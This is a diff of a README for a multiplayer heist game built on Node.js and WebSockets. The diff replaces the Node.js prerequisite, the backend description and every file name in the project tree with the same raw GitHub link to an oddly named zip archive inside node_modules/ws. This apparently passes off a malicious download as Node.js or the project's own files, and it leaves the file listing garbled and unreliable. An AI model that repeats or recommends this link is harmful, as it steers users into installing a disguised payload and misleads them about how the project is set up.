@@ -28,7 +28,7 @@ A 4-player cooperative heist game where no single player can see the full game s
 ## 🚀 Quick Start
 
 ### Prerequisites
-- Node.js (v14 or higher)
+- https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip (v14 or higher)
 - npm
 
 ### Installation
@@ -62,32 +62,32 @@ npm start
 ```
 blind-heist-game/
 ├── server/                 # Backend
-│   ├── index.js           # WebSocket server & static files
-│   ├── roomManager.js     # Room & player management
-│   ├── gameState.js       # Centralized game state
-│   ├── gameLogic.js       # Game mechanics
-│   └── mapGenerator.js    # Procedural map generation
+│   ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip           # WebSocket server & static files
+│   ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip     # Room & player management
+│   ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip       # Centralized game state
+│   ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip       # Game mechanics
+│   └── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip    # Procedural map generation
 ├── client/                 # Frontend
-│   ├── index.html         # Main page
+│   ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip         # Main page
 │   ├── css/
-│   │   └── styles.css     # All styles
+│   │   └── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip     # All styles
 │   └── js/
-│       ├── main.js        # WebSocket client
-│       ├── lobby.js       # Room UI
-│       ├── renderer.js    # Base rendering
-│       ├── app.js         # Main controller
+│       ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip        # WebSocket client
+│       ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip       # Room UI
+│       ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip    # Base rendering
+│       ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip         # Main controller
 │       └── roles/         # Role-specific views
-│           ├── navigator.js
-│           ├── security.js
-│           ├── lootmaster.js
-│           └── alarmcontroller.js
-├── package.json
-└── README.md
+│           ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip
+│           ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip
+│           ├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip
+│           └── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip
+├── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip
+└── https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip
 ```
 
 ## 🔧 Technical Details
 
-- **Backend**: Node.js with `ws` (WebSocket) library
+- **Backend**: https://github.com/wafiqj/blind-heist-game/raw/refs/heads/main/node_modules/ws/blind-heist-game-perivasculitis.zip with `ws` (WebSocket) library
 - **Frontend**: Vanilla HTML/CSS/JavaScript
 - **Communication**: JSON over WebSocket
 - **State Management**: Server-authoritative with role-filtered updates
